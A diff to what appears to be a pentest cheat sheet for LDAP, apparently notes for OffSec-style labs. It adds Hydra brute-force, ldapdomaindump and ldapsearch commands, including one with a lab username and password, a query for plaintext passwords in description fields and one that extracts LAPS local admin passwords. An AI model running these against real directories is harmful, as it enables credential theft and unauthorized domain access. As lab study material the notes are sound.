@@ -231,6 +231,20 @@
 9. Hydra: hydra -l <Username> -P <Big_Passwordlist> <IP> ldap2 -V -f
 LDAP Login: ldapdomaindump <IP> [-r <IP>] -u '<domain\user>' -p '<pass>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
 
+10. ldapdomaindump 10.10.55.72 -u 'LAB-ENTERPRISE\nik' -p ToastyBoi! -o ldapdomaindumpdir
+
+
+Found this useful as well:
+
+ldapsearch -H ldap://<IP> -x -b "DC=hutch,DC=offsec"
+
+ldapsearch -H ldap://192.168.71.122 -x -b "CN=Users,DC=hutch,DC=offsec"  # Get User info
+
+# Look for any plaintext passwords in the description field
+ldapsearch -H "ldap://<IP>" -v -x -b "DC=hutch,DC=offsec" "(objectclass=*)"
+
+# If LAPS is found on the server, can look for admin password
+ldapsearch -H ldap://<IP> -v -x -D <USER>@HUTCH.OFFSEC -w <PASS>-b "DC=hutch,DC=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 
 ```
 
